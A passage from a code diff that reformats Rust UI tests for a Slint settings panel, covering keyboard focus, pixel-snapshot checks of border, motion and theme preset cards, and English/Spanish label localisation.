-        if (line.contains("clicked =>") || line.contains("toggled") || line.contains("focus-requested"))
+        if (line.contains("clicked =>")
+            || line.contains("toggled")
+            || line.contains("focus-requested"))
             && !line.trim_start().starts_with("//")
         {
             assert!(
@@ -7968,8 +8541,8 @@ fn motion_mouse_converges_keyboard_focus_by_construction() {
             );
         }
     }
-    let root = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let root =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     assert!(
         root.contains("focus-requested(idx) => { root.motion-focused-index = idx; }"),
         "PanelRoot must move motion-focused-index on the section's focus-requested"
@@ -8005,8 +8578,8 @@ fn panel_scopes_ignore_mouse_focus_by_construction() {
         );
     }
     // PanelRoot owns the single scope and exposes the programmatic entry.
-    let root = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let root =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     assert!(
         root.contains("panel-kbd := FocusScope"),
         "PanelRoot must own the single panel-kbd FocusScope"
@@ -8119,7 +8692,10 @@ fn borders_card_click_moves_keyboard_cursor() {
 
     // Card 0 owns the keyboard cursor by default, so the first bg-card band in
     // the list pane is the unfocused SECOND card.
-    let shot = win.window().take_snapshot().expect("borders cards snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("borders cards snapshot");
     let second = first_color_band_bbox(&shot, BG_CARD, 8, 170, 120, 1040, 1080, 300, None)
         .expect("the Borders list must paint its unfocused card");
     let (cx, cy) = ((second.0 + second.2) / 2, (second.1 + second.3) / 2);
@@ -8223,7 +8799,10 @@ fn filters_card_click_moves_keyboard_cursor() {
     win.set_panel_kbd_preview_index(-1);
     settle_frames(30);
 
-    let shot = win.window().take_snapshot().expect("filters cards snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("filters cards snapshot");
     let second = first_color_band_bbox(&shot, BG_CARD, 8, 170, 120, 1920, 1080, 300, None)
         .expect("the Filters list must paint its unfocused card");
     let (cx, cy) = ((second.0 + second.2) / 2, (second.1 + second.3) / 2);
@@ -8374,7 +8953,10 @@ fn borders_apply_switch_click_moves_keyboard_cursor() {
 
     // Card 0 owns the keyboard cursor by default, so the first bg-card band in
     // the list pane is the unfocused SECOND card.
-    let shot = win.window().take_snapshot().expect("borders cards snapshot");
+    let shot = win
+        .window()
+        .take_snapshot()
+        .expect("borders cards snapshot");
     let second = first_color_band_bbox(&shot, BG_CARD, 8, 170, 120, 1040, 1080, 300, None)
         .expect("the Borders list must paint its unfocused card");
     // The built-in card's only action is the 40x22 apply pill trailing the
@@ -8640,7 +9222,10 @@ fn motion_preset_apply_reflects_the_file_in_the_tune_pane() {
         "the pane must read the file's style"
     );
 
-    let after = win.window().take_snapshot().expect("motion applied snapshot");
+    let after = win
+        .window()
+        .take_snapshot()
+        .expect("motion applied snapshot");
     save_slice_png(after, "motion_preset_apply_pane.png");
 }
 
@@ -8693,7 +9278,15 @@ fn card_click_focus_ring_renders_on_clicked_card() {
 
     // The unfocused card paints NO icy ring; the clicked one paints its 1px
     // icy border (two full-width bands) once the cursor converges on it.
-    let before_icy = count_color_in_box(&before, ICY, 40, second.0, second.1, second.2 + 1, second.3 + 1);
+    let before_icy = count_color_in_box(
+        &before,
+        ICY,
+        40,
+        second.0,
+        second.1,
+        second.2 + 1,
+        second.3 + 1,
+    );
     let y0 = second.1.saturating_sub(70);
     let after_icy = count_color_in_box(&after, ICY, 40, second.0, y0, second.2 + 1, second.3 + 1);
     assert!(
@@ -8732,8 +9325,8 @@ fn system_active_applies_on_startup_by_construction() {
 /// change), so the active section owns the keyboard immediately.
 #[test]
 fn panel_open_hands_focus_to_content() {
-    let src = std::fs::read_to_string("ui/panel/PanelRoot.slint")
-        .expect("PanelRoot.slint must exist");
+    let src =
+        std::fs::read_to_string("ui/panel/PanelRoot.slint").expect("PanelRoot.slint must exist");
     assert!(
         src.contains("changed open =>"),
         "PanelRoot must react to open changes — otherwise re-open strands focus"
@@ -8754,8 +9347,14 @@ fn panel_open_hands_focus_to_content() {
         for line in s.lines() {
             if line.contains("changed has-hover") && !line.trim_start().starts_with("//") {
                 let hover_seg = &line[line.find("changed has-hover").unwrap()..];
-                assert!(!hover_seg.contains("focused-row"), "hover in {path} must not move focused-row: {line}");
-                assert!(!hover_seg.contains(".focus()"), "hover in {path} must not touch focus: {line}");
+                assert!(
+                    !hover_seg.contains("focused-row"),
+                    "hover in {path} must not move focused-row: {line}"
+                );
+                assert!(
+                    !hover_seg.contains(".focus()"),
+                    "hover in {path} must not touch focus: {line}"
+                );
             }
         }
     }
@@ -8867,7 +9466,7 @@ fn live_scopes_ignore_mouse_focus_by_construction() {
 #[test]
 fn gallery_keyboard_works_after_leaving_panel() {
     use slint::platform::Key;
-    
+
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -8902,7 +9501,7 @@ fn gallery_keyboard_works_after_leaving_panel() {
 #[test]
 fn gallery_keyboard_works_after_mutating_panel_leave() {
     use slint::platform::Key;
-    
+
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -8940,7 +9539,7 @@ fn gallery_keyboard_works_after_mutating_panel_leave() {
 #[test]
 fn gallery_keyboard_works_after_closing_drawer() {
     use slint::platform::Key;
-    
+
     use std::cell::RefCell;
     use std::rc::Rc;
 
@@ -9057,10 +9656,16 @@ fn borders_tune_pane_fixture(colors: &[&str]) -> crate::MainWindow {
     // follow_the_language` runs the real `scan.sh` and gets "Cascada" in Spanish.
     // Do not read `borders_i18n_es_top.png`'s card name as a localisation check —
     // that frame proves the PANEL copy, and this literal is what it paints.
-    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from("Cascade")])));
-    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from("soft gradient")])));
+    win.set_border_titles(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "Cascade",
+    )])));
+    win.set_border_descs(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "soft gradient",
+    )])));
     win.set_border_tags(ModelRc::new(VecModel::from(vec![SharedString::from("")])));
-    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from("01_cascade.lua")])));
+    win.set_border_files(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "01_cascade.lua",
+    )])));
     win.set_tune_active_colors(ModelRc::new(VecModel::from(
         colors
             .iter()
@@ -9401,9 +10006,8 @@ fn borders_strip_renders_correct_chip_count() {
     let mut boxes = Vec::new();
     for (i, rgb) in CHIP_COLORS.iter().take(3).enumerate() {
         let painted = count_exact_color(&shot, *rgb, 8);
-        let bbox = exact_color_bbox(&shot, *rgb, 8).unwrap_or_else(|| {
-            panic!("chip {} must paint its resolved colour {rgb:?}", i + 1)
-        });
+        let bbox = exact_color_bbox(&shot, *rgb, 8)
+            .unwrap_or_else(|| panic!("chip {} must paint its resolved colour {rgb:?}", i + 1));
         // A 16×16 swatch paints ~196px through its 1px border and 4px radius
         // (measured), NOT up to 400: the band pins the size instead of merely
         // accepting it, so a chip that grew into a full card would fail here.
@@ -9448,7 +10052,10 @@ fn borders_strip_renders_correct_chip_count() {
         x1 + 14,
         y1 + 14,
     );
-    assert!(ring > 30, "the active chip must carry the icy focus ring (pixels={ring})");
+    assert!(
+        ring > 30,
+        "the active chip must carry the icy focus ring (pixels={ring})"
+    );
     let (fx0, fy0, fx1, fy1) = boxes[2];
     let no_ring = count_color_in_box(
         &shot,
@@ -9459,7 +10066,10 @@ fn borders_strip_renders_correct_chip_count() {
         fx1 + 14,
         fy1 + 14,
     );
-    assert_eq!(no_ring, 0, "only the active chip is ringed (pixels={no_ring})");
+    assert_eq!(
+        no_ring, 0,
+        "only the active chip is ringed (pixels={no_ring})"
+    );
 }
 
 /// R3/R10 — the picker is a card IN THE FLOW directly above the strip, not a
@@ -9511,7 +10121,10 @@ fn borders_strip_picker_opens_above_strip() {
         open.width() as usize,
         open.height() as usize,
     );
-    assert!(diff > 5000, "opening the picker must change the pane materially (ink={diff})");
+    assert!(
+        diff > 5000,
+        "opening the picker must change the pane materially (ink={diff})"
+    );
 
     // The picker card paints an accent-cyan 1px border across the pane width,
     // so its top and bottom edges are full-width cyan rows — exactly two of
@@ -9537,7 +10150,15 @@ fn borders_strip_picker_opens_above_strip() {
     // 16px padding), so the card must land within one padding of it.
     let closed_pane_top = (150..closed.height() as usize)
         .find(|&y| {
-            count_color_in_box(&closed, BORDER_INK, 4, 360, y, closed.width() as usize, y + 1) >= 600
+            count_color_in_box(
+                &closed,
+                BORDER_INK,
+                4,
+                360,
+                y,
+                closed.width() as usize,
+                y + 1,
+            ) >= 600
         })
         .expect("the closed pane must paint its first card edge");
     assert!(
@@ -9744,7 +10365,10 @@ fn borders_geometry_block_renders_each_slider() {
     win.set_gap_out(6);
     focus_settle();
 
-    let block = win.window().take_snapshot().expect("geometry block snapshot");
+    let block = win
+        .window()
+        .take_snapshot()
+        .expect("geometry block snapshot");
     save_slice_png(block.clone(), "borders_geometry_block.png");
 
     // card 0 → Down → size → Down → radius.
@@ -9763,7 +10387,10 @@ fn borders_geometry_block_renders_each_slider() {
 
     focus_press_key(&win, Key::DownArrow);
     focus_settle();
-    let gap_out = win.window().take_snapshot().expect("gap-out focus snapshot");
+    let gap_out = win
+        .window()
+        .take_snapshot()
+        .expect("gap-out focus snapshot");
     save_slice_png(gap_out.clone(), "borders_geometry_gapout_focus.png");
     assert_geometry_slider_row(&gap_out, "gap-out");
 }
@@ -9790,9 +10417,18 @@ fn animation_bearing_preset_round_trips_through_the_tune_model() {
         crate::callbacks::BorderGeometry::default(),
     );
     let loaded = win.get_tune_animations().to_string();
-    assert!(loaded.contains("borderangle"), "the angle leaf must load: {loaded}");
-    assert!(loaded.contains("fadeShadow"), "the shadow leaf must load: {loaded}");
-    assert!(win.get_tune_rule_enabled(), "the floating-window rule must load");
+    assert!(
+        loaded.contains("borderangle"),
+        "the angle leaf must load: {loaded}"
+    );
+    assert!(
+        loaded.contains("fadeShadow"),
+        "the shadow leaf must load: {loaded}"
+    );
+    assert!(
+        win.get_tune_rule_enabled(),
+        "the floating-window rule must load"
+    );
 
     // The save path rebuilds BorderParams from the tune model.
     let params = crate::tune_params_from_window(&win, 2);
@@ -9891,17 +10527,20 @@ fn borders_tune_seat_map_walks_each_remaining_control_once() {
         let log = log.borrow();
         let expected = if colors.is_empty() { 0 } else { 1 };
         assert_eq!(
-            log.adds, expected,
+            log.adds,
+            expected,
             "colours={}: add must fire once at its seat (and never at a ghost)",
             colors.len()
         );
         assert_eq!(
-            log.removes, expected,
+            log.removes,
+            expected,
             "colours={}: remove must fire once at its seat",
             colors.len()
         );
         assert_eq!(
-            log.saves, 1,
+            log.saves,
+            1,
             "colours={}: the walk's LAST seat must be Save ({} seats walked)",
             colors.len(),
             expected_walk
@@ -10332,7 +10971,10 @@ fn borders_panel_labels_follow_the_language() {
     save_slice_png(en_top.clone(), "borders_i18n_en_top.png");
     win.set_panel_kbd_preview_index(14);
     settle_frames(80);
-    let en_save = win.window().take_snapshot().expect("english glow and save area");
+    let en_save = win
+        .window()
+        .take_snapshot()
+        .expect("english glow and save area");
     save_slice_png(en_save.clone(), "borders_i18n_en_save.png");
 
     // Spanish, through the REAL production function `main()` calls.
@@ -10346,11 +10988,17 @@ fn borders_panel_labels_follow_the_language() {
     save_slice_png(es_top.clone(), "borders_i18n_es_top.png");
     win.set_panel_kbd_preview_index(14);
     settle_frames(80);
-    let es_save = win.window().take_snapshot().expect("spanish glow and save area");
+    let es_save = win
+        .window()
+        .take_snapshot()
+        .expect("spanish glow and save area");
     save_slice_png(es_save.clone(), "borders_i18n_es_save.png");
 
     // The switch reached the FRAME, not only the global: the panel repainted.
-    for (label, en, es) in [("tune pane", &en_top, &es_top), ("glow and save area", &en_save, &es_save)] {
+    for (label, en, es) in [
+        ("tune pane", &en_top, &es_top),
+        ("glow and save area", &en_save, &es_save),
+    ] {
         let changed = frame_diff(en, es, TUNE_AREA);
         assert!(
             changed > 500,
@@ -10364,7 +11012,10 @@ fn borders_panel_labels_follow_the_language() {
     assert_borders_composed(&win, "en");
     win.set_panel_kbd_preview_index(5);
     settle_frames(80);
-    let en_again = win.window().take_snapshot().expect("english tune pane, restored");
+    let en_again = win
+        .window()
+        .take_snapshot()
+        .expect("english tune pane, restored");
     assert_eq!(
         frame_diff(&en_top, &en_again, TUNE_AREA),
         0,
@@ -10580,9 +11231,10 @@ fn the_preset_card_apply_hover_help_renders() {
     settle_frames(80);
 
     // Parked off the cards: the reference frame, with no help up.
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-        position: slint::LogicalPosition::new(400.0, 600.0),
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerMoved {
+            position: slint::LogicalPosition::new(400.0, 600.0),
+        });
     settle_frames(40);
 
     let before = win.window().take_snapshot().expect("before hover");
@@ -10591,12 +11243,10 @@ fn the_preset_card_apply_hover_help_renders() {
         .expect("the active card must paint its green apply switch");
     println!("apply switch bbox: ({x0},{y0}) .. ({x1},{y1})");
 
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-        position: slint::LogicalPosition::new(
-            (x0 + x1) as f32 / 2.0,
-            (y0 + y1) as f32 / 2.0,
-        ),
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerMoved {
+            position: slint::LogicalPosition::new((x0 + x1) as f32 / 2.0, (y0 + y1) as f32 / 2.0),
+        });
     settle_frames(40); // 640ms — past the 300ms hover delay
 
     let after = win.window().take_snapshot().expect("after hover");
@@ -10686,8 +11336,12 @@ fn preset_card_apply_switch_is_vertically_centred_in_the_card() {
         SharedString::from("13_the_joker.lua"),
         SharedString::from("14_looper.lua"),
     ])));
-    win.set_user_border_preset_names(ModelRc::new(VecModel::from(vec![SharedString::from("COCO")])));
-    win.set_user_border_preset_tags(ModelRc::new(VecModel::from(vec![SharedString::from("USUARIO")])));
+    win.set_user_border_preset_names(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "COCO",
+    )])));
+    win.set_user_border_preset_tags(ModelRc::new(VecModel::from(vec![SharedString::from(
+        "USUARIO",
+    )])));
     win.set_active_border_index(6);
     // Minimal tune state, so the tune pane beside the list renders.
     win.set_border_size(2);
@@ -10706,11 +11360,12 @@ fn preset_card_apply_switch_is_vertically_centred_in_the_card() {
     // built-in cards push the expanded COCO card's bottom edge 12px past the
     // pane, and they can see it whole. One small wheel tick over the LIST pane
     // (the left half) reproduces that scroll.
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerScrolled {
-        position: slint::LogicalPosition::new(400.0, 500.0),
-        delta_x: 0.0,
-        delta_y: -60.0,
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerScrolled {
+            position: slint::LogicalPosition::new(400.0, 500.0),
+            delta_x: 0.0,
+            delta_y: -60.0,
+        });
     settle_frames(80);
 
     let shot = win.window().take_snapshot().expect("preset card snapshot");
@@ -10884,15 +11539,32 @@ fn sibling_card_lists_keep_their_apply_control_centred() {
     save_slice_png(motion_shot.clone(), "sibling_motion_card_centring.png");
     let (mw, mh) = (motion_shot.width() as usize, motion_shot.height() as usize);
     const PANE_LEFT: usize = 170;
-    let amber_rows = wide_ink_rows(&motion_shot, ACCENT_AMBER, 8, 200, 0, mh - 1, PANE_LEFT, mw - 1);
+    let amber_rows = wide_ink_rows(
+        &motion_shot,
+        ACCENT_AMBER,
+        8,
+        200,
+        0,
+        mh - 1,
+        PANE_LEFT,
+        mw - 1,
+    );
     let m_top = *amber_rows
         .first()
         .expect("Motion's active user card must paint its amber border");
     let m_bottom = *amber_rows
         .last()
         .expect("Motion's active user card must paint its amber border");
-    let (m_left, m_right) = ink_x_span(&motion_shot, ACCENT_AMBER, 8, m_top, m_bottom, PANE_LEFT, mw - 1)
-        .expect("Motion's amber border must span the card");
+    let (m_left, m_right) = ink_x_span(
+        &motion_shot,
+        ACCENT_AMBER,
+        8,
+        m_top,
+        m_bottom,
+        PANE_LEFT,
+        mw - 1,
+    )
+    .expect("Motion's amber border must span the card");
     let motion = measure_card(
         &motion_shot,
         "Motion MI CURVA (user, active)",
@@ -10929,23 +11601,48 @@ fn sibling_card_lists_keep_their_apply_control_centred() {
     let save_shot = win.window().take_snapshot().expect("save card snapshot");
     save_slice_png(save_shot.clone(), "sibling_save_card_centring.png");
     let (sw, sh) = (save_shot.width() as usize, save_shot.height() as usize);
-    let pink_rows = wide_ink_rows(&save_shot, ACCENT_PINK, 8, 200, 0, sh - 1, PANE_LEFT, sw - 1);
+    let pink_rows = wide_ink_rows(
+        &save_shot,
+        ACCENT_PINK,
+        8,
+        200,
+        0,
+        sh - 1,
+        PANE_LEFT,
+        sw - 1,
+    );
     let s_top = *pink_rows
         .first()
         .expect("the active theme card must paint its pink border");
     let s_bottom = *pink_rows
         .last()
         .expect("the active theme card must paint its pink border");
-    let (s_left, s_right) = ink_x_span(&save_shot, ACCENT_PINK, 8, s_top, s_bottom, PANE_LEFT, sw - 1)
-        .expect("the pink border must span the theme card");
+    let (s_left, s_right) = ink_x_span(
+        &save_shot,
+        ACCENT_PINK,
+        8,
+        s_top,
+        s_bottom,
+        PANE_LEFT,
+        sw - 1,
+    )
+    .expect("the pink border must span the theme card");
     let s_centre = (s_top + s_bottom) / 2;
-    let apply = ink_span_in_band(&save_shot, SWITCH_ON_INK, 8, s_top, s_bottom, s_left, s_right)
-        .unwrap_or_else(|| {
-            panic!(
-                "the active theme card must paint its 32x32 accent-green apply square inside \
+    let apply = ink_span_in_band(
+        &save_shot,
+        SWITCH_ON_INK,
+        8,
+        s_top,
+        s_bottom,
+        s_left,
+        s_right,
+    )
+    .unwrap_or_else(|| {
+        panic!(
+            "the active theme card must paint its 32x32 accent-green apply square inside \
                  {s_top}..{s_bottom}"
-            )
-        });
+        )
+    });
     let delete = ink_span_in_band(&save_shot, ACCENT_RED, 8, s_top, s_bottom, s_left, s_right)
         .expect("the active theme card must paint its red ✕ button");
     println!(
@@ -10954,7 +11651,10 @@ fn sibling_card_lists_keep_their_apply_control_centred() {
     );
 
     let mut wrong = motion.problems("Motion MI CURVA (user, active)", true);
-    for (what, span, bound) in [("apply square", apply, 1usize), ("✕ button", delete, 1usize)] {
+    for (what, span, bound) in [
+        ("apply square", apply, 1usize),
+        ("✕ button", delete, 1usize),
+    ] {
         let got = (span.0 + span.1) / 2;
         if got.abs_diff(s_centre) > bound {
             wrong.push(format!(
@@ -11023,16 +11723,18 @@ fn the_theme_card_apply_hover_help_renders() {
     let cy = (y0 + y1) as f32 / 2.0;
 
     // Parked off the card: the reference frame, with no help up.
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-        position: slint::LogicalPosition::new(400.0, 600.0),
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerMoved {
+            position: slint::LogicalPosition::new(400.0, 600.0),
+        });
     settle_frames(40);
     let parked = win.window().take_snapshot().expect("parked");
     save_slice_png(parked.clone(), "apply_help_theme_parked.png");
 
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-        position: slint::LogicalPosition::new(cx, cy),
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerMoved {
+            position: slint::LogicalPosition::new(cx, cy),
+        });
     settle_frames(40); // 640ms — past the 300ms hover delay
 
     let after = win.window().take_snapshot().expect("after hover");
@@ -11047,11 +11749,15 @@ fn the_theme_card_apply_hover_help_renders() {
     // in a shared component: the refresh button is the next one in the row
     // (32px wide + 6px spacing), so it sits 38px to the right. The apply help
     // is gone by then (the pointer left it), so this diff is that label alone.
-    win.window().dispatch_event(slint::platform::WindowEvent::PointerMoved {
-        position: slint::LogicalPosition::new(cx + 38.0, cy),
-    });
+    win.window()
+        .dispatch_event(slint::platform::WindowEvent::PointerMoved {
+            position: slint::LogicalPosition::new(cx + 38.0, cy),
+        });
     settle_frames(40);
-    let sibling = win.window().take_snapshot().expect("after hovering refresh");
+    let sibling = win
+        .window()
+        .take_snapshot()
+        .expect("after hovering refresh");
     save_slice_png(sibling.clone(), "apply_help_theme_refresh.png");
     let sibling_help = frame_diff(&parked, &sibling, PRESET_LIST_AREA);
     assert!(
@@ -11091,21 +11797,53 @@ fn border_preset_names_and_descriptions_follow_the_language() {
 
     // The 14 preset FILES the repo actually ships, in scan order.
     const FILES: &[&str] = &[
-        "01_cascade.lua", "02_diagonal.lua", "03_duo.lua", "04_tri.lua",
-        "05_spectrum.lua", "06_pulse.lua", "07_infinity.lua", "08_neon.lua",
-        "09_glitch.lua", "10_golden.lua", "11_toxic.lua", "12_neon_cyberpunk.lua",
-        "13_the_joker.lua", "14_looper.lua",
+        "01_cascade.lua",
+        "02_diagonal.lua",
+        "03_duo.lua",
+        "04_tri.lua",
+        "05_spectrum.lua",
+        "06_pulse.lua",
+        "07_infinity.lua",
+        "08_neon.lua",
+        "09_glitch.lua",
+        "10_golden.lua",
+        "11_toxic.lua",
+        "12_neon_cyberpunk.lua",
+        "13_the_joker.lua",
+        "14_looper.lua",
     ];
     const EN_NAMES: &[&str] = &[
-        "Cascade", "Diagonal", "Duo Contrast", "Trident", "Spectrum", "Pulse",
-        "Infinity", "Neon Flicker", "Cyber Glitch", "Golden Luxury", "Toxic Green",
-        "Neon Cyber-Glow (Dual)", "The Joker", "Looper",
+        "Cascade",
+        "Diagonal",
+        "Duo Contrast",
+        "Trident",
+        "Spectrum",
+        "Pulse",
+        "Infinity",
+        "Neon Flicker",
+        "Cyber Glitch",
+        "Golden Luxury",
+        "Toxic Green",
+        "Neon Cyber-Glow (Dual)",
+        "The Joker",
+        "Looper",
     ];
     const EN_DESCS: &[&str] = &BORDER_PRESET_EN_DESCS;
     const ES_NAMES: &[&str] = &[
-        "Cascada", "Diagonal", "Dúo Contraste", "Tridente", "Espectro", "Latido",
-        "Infinito", "Parpadeo Neón", "Cyber Glitch", "Golden Luxury", "Verde Tóxico",
-        "Neón Cyber-Glow (Dual)", "El Joker", "Looper",
+        "Cascada",
+        "Diagonal",
+        "Dúo Contraste",
+        "Tridente",
+        "Espectro",
+        "Latido",
+        "Infinito",
+        "Parpadeo Neón",
+        "Cyber Glitch",
+        "Golden Luxury",
+        "Verde Tóxico",
+        "Neón Cyber-Glow (Dual)",
+        "El Joker",
+        "Looper",
     ];
     const ES_DESCS: &[&str] = &BORDER_PRESET_ES_DESCS;
 
@@ -11115,8 +11853,16 @@ fn border_preset_names_and_descriptions_follow_the_language() {
         FILES,
         "the scan must find every shipped border preset"
     );
-    assert_eq!(model_strings(&win.get_border_titles()), EN_NAMES, "english names");
-    assert_eq!(model_strings(&win.get_border_descs()), EN_DESCS, "english descriptions");
+    assert_eq!(
+        model_strings(&win.get_border_titles()),
+        EN_NAMES,
+        "english names"
+    );
+    assert_eq!(
+        model_strings(&win.get_border_descs()),
+        EN_DESCS,
+        "english descriptions"
+    );
 
     win.set_panel_kbd_preview_index(0);
     settle_frames(80);
@@ -11124,8 +11870,16 @@ fn border_preset_names_and_descriptions_follow_the_language() {
     save_slice_png(en.clone(), "borders_i18n_en_presets.png");
 
     crate::presets::populate_presets(&win, &engine, &cfg, &crate::tr::Tr::with_lang("es"));
-    assert_eq!(model_strings(&win.get_border_titles()), ES_NAMES, "spanish names");
-    assert_eq!(model_strings(&win.get_border_descs()), ES_DESCS, "spanish descriptions");
+    assert_eq!(
+        model_strings(&win.get_border_titles()),
+        ES_NAMES,
+        "spanish names"
+    );
+    assert_eq!(
+        model_strings(&win.get_border_descs()),
+        ES_DESCS,
+        "spanish descriptions"
+    );
 
     settle_frames(80);
     let es = win.window().take_snapshot().expect("spanish preset list");
@@ -11151,7 +11905,10 @@ fn border_preset_names_and_descriptions_follow_the_language() {
             .iter()
             .find(|p| p.file == file)
             .unwrap_or_else(|| panic!("{file} must be scanned"));
-        assert_eq!(entry.raw_title, raw_title, "{file} keeps its @Title as the fallback");
+        assert_eq!(
+            entry.raw_title, raw_title,
+            "{file} keeps its @Title as the fallback"
+        );
         assert!(
             entry.i18n_title.starts_with("borders.presets."),
             "{file} must carry an i18n key path, got {:?}",
@@ -11200,7 +11957,10 @@ fn border_preset_descriptions_are_painted_and_follow_the_language() {
         .collect();
     win.set_border_descs(ModelRc::new(VecModel::from(blank)));
     settle_frames(80);
-    let es_blank = win.window().take_snapshot().expect("spanish list, descriptions emptied");
+    let es_blank = win
+        .window()
+        .take_snapshot()
+        .expect("spanish list, descriptions emptied");
     save_slice_png(es_blank.clone(), "borders_i18n_es_presets_descs_blank.png");
     let painted = frame_diff(&es, &es_blank, PRESET_LIST_AREA);
     assert!(
@@ -11215,7 +11975,10 @@ fn border_preset_descriptions_are_painted_and_follow_the_language() {
         .collect();
     win.set_border_descs(ModelRc::new(VecModel::from(en_descs)));
     settle_frames(80);
-    let es_en_descs = win.window().take_snapshot().expect("spanish list, english descriptions");
+    let es_en_descs = win
+        .window()
+        .take_snapshot()
+        .expect("spanish list, english descriptions");
     save_slice_png(es_en_descs.clone(), "borders_i18n_es_presets_en_descs.png");
     let relang = frame_diff(&es, &es_en_descs, PRESET_LIST_AREA);
     assert!(
@@ -11225,8 +11988,14 @@ fn border_preset_descriptions_are_painted_and_follow_the_language() {
 
     // (3) The wire, end to end.
     const CARD: &str = include_str!("../../ui/panel/sections/SavedPresetCard.slint");
-    assert!(CARD.contains("in property <string> desc"), "SavedPresetCard must take a `desc`");
-    assert!(CARD.contains("text: root.desc"), "the card must PAINT its `desc`");
+    assert!(
+        CARD.contains("in property <string> desc"),
+        "SavedPresetCard must take a `desc`"
+    );
+    assert!(
+        CARD.contains("text: root.desc"),
+        "the card must PAINT its `desc`"
+    );
     const SECTION: &str = include_str!("../../ui/panel/sections/BordersSection.slint");
     assert!(
         SECTION.contains("in property <[string]> builtin-descs"),
@@ -11284,7 +12053,8 @@ fn motion_builtin_cards_receive_a_guarded_description_binding() {
         .next()
         .expect("the built-in block must end before the user-preset loop");
     assert!(
-        builtin_block.contains("desc: i < root.builtin-descs.length ? root.builtin-descs[i] : \"\";"),
+        builtin_block
+            .contains("desc: i < root.builtin-descs.length ? root.builtin-descs[i] : \"\";"),
         "the built-in Motion card must paint the GUARDED `builtin-descs[i]` read"
     );
 
@@ -11446,7 +12216,10 @@ fn panel_chrome_follows_the_language() {
     crate::panel_i18n::apply_panel_chrome(&win, &crate::tr::Tr::with_lang("en"));
     assert_panel_chrome(&win, "en");
     settle_frames(80);
-    let en_again = win.window().take_snapshot().expect("english chrome, restored");
+    let en_again = win
+        .window()
+        .take_snapshot()
+        .expect("english chrome, restored");
     assert_eq!(
         frame_diff(&en, &en_again, CHROME_RAIL_AREA),
         0,
@@ -11470,7 +12243,10 @@ fn the_panel_chrome_reads_every_label_from_the_text_global() {
     let unbound: Vec<&str> = panel_chrome_labels()
         .iter()
         .map(|(name, _, _, _)| *name)
-        .filter(|name| !MENU.contains(&format!("PanelText.{name}")) && !ROOT.contains(&format!("PanelText.{name}")))
+        .filter(|name| {
+            !MENU.contains(&format!("PanelText.{name}"))
+                && !ROOT.contains(&format!("PanelText.{name}"))
+        })
         .collect();
     assert!(
         unbound.is_empty(),
@@ -11482,7 +12258,11 @@ fn the_panel_chrome_reads_every_label_from_the_text_global() {
     let hardcoded: Vec<(&str, &str)> = panel_chrome_labels()
         .iter()
         .filter(|(name, _, en, _)| {
-            let src = if panel_chrome_owner(name) == "PanelMenu" { MENU } else { ROOT };
+            let src = if panel_chrome_owner(name) == "PanelMenu" {
+                MENU
+            } else {
+                ROOT
+            };
             src.lines()
                 .filter(|l| !l.trim_start().starts_with("//"))
                 .any(|l| l.contains(&format!("\"{en}\"")))
@@ -11506,8 +12286,14 @@ fn the_panel_chrome_reads_every_label_from_the_text_global() {
 /// (file, source) for every file that paints one of the drawer pills.
 fn gallery_pill_sources() -> [(&'static str, &'static str); 2] {
     [
-        ("ui/gallery/FilterBar.slint", include_str!("../../ui/gallery/FilterBar.slint")),
-        ("ui/gallery/GalleryRoot.slint", include_str!("../../ui/gallery/GalleryRoot.slint")),
+        (
+            "ui/gallery/FilterBar.slint",
+            include_str!("../../ui/gallery/FilterBar.slint"),
+        ),
+        (
+            "ui/gallery/GalleryRoot.slint",
+            include_str!("../../ui/gallery/GalleryRoot.slint"),
+        ),
     ]
 }
 
@@ -11524,7 +12310,11 @@ fn gallery_drawer_pills_read_the_panel_text_global() {
     for (file, src) in gallery_pill_sources() {
         // FilterBar paints one pill per section; GalleryRoot paints the drawer
         // twice (behind the stage in Slider, in front in Mosaic).
-        let expected = if file.ends_with("FilterBar.slint") { 1 } else { 2 };
+        let expected = if file.ends_with("FilterBar.slint") {
+            1
+        } else {
+            2
+        };
         for (name, en) in &nav {
             let binding = format!("label: PanelText.{name};");
             assert_eq!(
@@ -11597,7 +12387,10 @@ fn borders_strip_flow_renders() {
         .collect();
     for pair in closed_boxes.windows(2) {
         let (a, b) = (pair[0], pair[1]);
-        assert!(b.0 > a.2, "closed chips must sit left to right: {a:?} then {b:?}");
+        assert!(
+            b.0 > a.2,
+            "closed chips must sit left to right: {a:?} then {b:?}"
+        );
         assert!(
             a.1.abs_diff(b.1) <= 24 && a.3.abs_diff(b.3) <= 24,
             "closed chips must share one row: {a:?} then {b:?}"
@@ -11692,7 +12485,9 @@ fn borders_strip_flow_renders() {
     save_slice_png(compact.clone(), "borders_strip_flow_compact_row.png");
     let bands = color_row_bands(&compact, ICY, 40, 300);
     assert!(
-        bands.windows(2).any(|w| (40..=60).contains(&(w[1].0 - w[0].0))),
+        bands
+            .windows(2)
+            .any(|w| (40..=60).contains(&(w[1].0 - w[0].0))),
